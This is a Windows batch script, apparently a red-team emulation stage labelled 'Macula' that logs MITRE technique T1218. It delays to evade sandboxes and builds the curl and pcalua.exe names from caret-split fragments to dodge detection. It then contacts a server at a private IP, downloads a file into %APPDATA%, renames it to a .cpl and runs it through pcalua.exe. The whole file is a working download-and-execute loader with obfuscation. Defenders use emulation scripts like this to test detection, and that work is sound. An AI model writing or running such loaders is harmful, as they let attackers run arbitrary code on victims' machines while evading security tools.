@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET yktnwwf=%APPDATA%\8188\a4094dfc
SET fpakbq=Macula-Stage0-8188
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8188-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=surfshark.txt
SET fpldhe=8188

REM Helper variables for logging and paths
SET krpsl=%APPDATA%\!yydue!
SET lfwrh=!krpsl!\macula-simulations.log
SET jhqmn=!yktnwwf!\!edjwtl!
SET dfcty=!yktnwwf!\pcafile.cpl

REM Initial sandbox evasion delay (30-60s)
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Initial delay start>>> "!lfwrh!" 2>nul
SET /A qytrp=!RANDOM! %% 31 + 30
timeout /t !qytrp! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Initial delay !qytrp!s complete>>> "!lfwrh!" 2>nul

REM TTP T1218: Signed Binary Proxy Execution - Pcalua.exe DLL load
SET res_ttp=0
SET err_ttp=

REM Create target directory if missing
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Creating directory !yktnwwf!>>> "!lfwrh!" 2>nul
mkdir "!yktnwwf!" >nul 2>&1

REM STEP 1: CORRECTED C2 HEARTBEAT WITH PROPER CURL SYNTAX
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Starting heartbeat check>>> "!lfwrh!" 2>nul

REM Obfuscated curl executable with proper fragmentation
SET s1=c^
SET s2=u^
SET s3=r^
SET s4=l
SET curlexe=!s1!!s2!!s3!!s4!

REM Correctly fragmented curl arguments with proper spacing
SET a1=-^
SET a2=k^
SET a3= -^
SET a4=s^
SET a5= -^
SET a6=o^
SET a7= ^
SET a8=n^
SET a9=u^
SET a10=l
SET curlargs=!a1!!a2!!a3!!a4!!a5!!a6!!a7!!a8!!a9!!a10!

REM Execute heartbeat with properly formed command
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Executing: !curlexe! !curlargs! !rdzgrnne!>>> "!lfwrh!" 2>nul
!curlexe! !curlargs! "!rdzgrnne!" >nul 2>&1
IF !ERRORLEVEL! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Heartbeat success (exit !ERRORLEVEL!)>>> "!lfwrh!" 2>nul
    SET hbres=1
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Heartbeat failed (exit !ERRORLEVEL!)>>> "!lfwrh!" 2>nul
    SET hbres=0
    SET err_ttp=heartbeat_failed_!ERRORLEVEL!
)

REM Inter-step delay
ping -n 8 127.0.0.1 >nul

REM STEP 2: Download DLL from external server only if heartbeat succeeded
IF !hbres! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Download start from !repbmqg!>>> "!lfwrh!" 2>nul
    
    !curlexe! -k -s -o "!jhqmn!" "!repbmqg!" >nul 2>&1
    IF EXIST "!jhqmn!" (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Download complete>>> "!lfwrh!" 2>nul
        SET dlres=1
    ) ELSE (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Download failed>>> "!lfwrh!" 2>nul
        SET dlres=0
        SET err_ttp=download_failed
    )
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Skipping download due to heartbeat failure>>> "!lfwrh!" 2>nul
    SET dlres=0
)

REM Inter-step delay
timeout /t 10 /nobreak >nul

REM STEP 3: Rename DLL to CPL extension
IF !dlres! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Renaming !edjwtl! to pcafile.cpl>>> "!lfwrh!" 2>nul
    ren "!jhqmn!" pcafile.cpl >nul 2>&1
    IF EXIST "!dfcty!" (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Rename successful>>> "!lfwrh!" 2>nul
        SET renres=1
    ) ELSE (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Rename failed>>> "!lfwrh!" 2>nul
        SET renres=0
        SET err_ttp=rename_failed
    )
)

REM Inter-step delay
CHOICE /C Y /N /D Y /T 7 >nul

REM STEP 4: Execute CPL via Pcalua.exe with obfuscation
IF !renres! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Starting Pcalua execution>>> "!lfwrh!" 2>nul
    
    REM Build Pcalua.exe path with obfuscation
    SET p1=C^
    SET p2=:^
    SET p3=^ ^
    SET p4=Wi^
    SET p5=nd^
    SET p6=ow^
    SET p7=s^
    SET p8=^ ^
    SET p9=S^
    SET p10=ys^
    SET p11=te^
    SET p12=m^
    SET p13=3^
    SET p14=2^
    SET p15=^ ^
    SET p16=p^
    SET p17=c^
    SET p18=a^
    SET p19=l^
    SET p20=u^
    SET p21=a^
    SET p22=.
    SET p23=e^
    SET p24=x^
    SET p25=e
    SET pcalexe=!p1!!p2!!p3!!p4!!p5!!p6!!p7!!p8!!p9!!p10!!p11!!p12!!p13!!p14!!p15!!p16!!p17!!p18!!p19!!p20!!p21!!p22!!p23!!p24!!p25!
    
    REM Execute with minimal argument obfuscation
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Executing: !pcalexe! -a !dfcty!>>> "!lfwrh!" 2>nul
    !pcalexe! -a "!dfcty!" >nul 2>&1
    IF !ERRORLEVEL! EQU 0 (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Pcalua execution successful (exit 0)>>> "!lfwrh!" 2>nul
        SET res_ttp=1
        SET err_ttp=
    ) ELSE (
        echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Pcalua execution failed (exit !ERRORLEVEL!)>>> "!lfwrh!" 2>nul
        SET err_ttp=execution_error_!ERRORLEVEL!
    )
)

REM Random final delay
SET /A finaldelay=!RANDOM! %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Final delay !finaldelay!s start>>> "!lfwrh!" 2>nul
timeout /t !finaldelay! /nobreak >nul

REM TTP Logging
SET ttp_id=T1218
SET ttp_name=SignedBinaryProxyExecution

REM Normalize timestamp to YYYY-MM-DD HH:MM:SS.SSS
SET logdate=!DATE:/=-!
SET logtime=!TIME:.=:!
SET logtime=!logtime: =0!

REM Build log line and append to file
IF DEFINED res_ttp (
    echo [!logdate! !logtime!][!omxgazu!]: !yydue!-!fpldhe!-!ttp_id!|!ttp_name!=!res_ttp!:!err_ttp!>> "!lfwrh!" 2>nul || echo.
)

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: Simulation complete>>> "!lfwrh!" 2>nul

ENDLOCAL
exit /b 0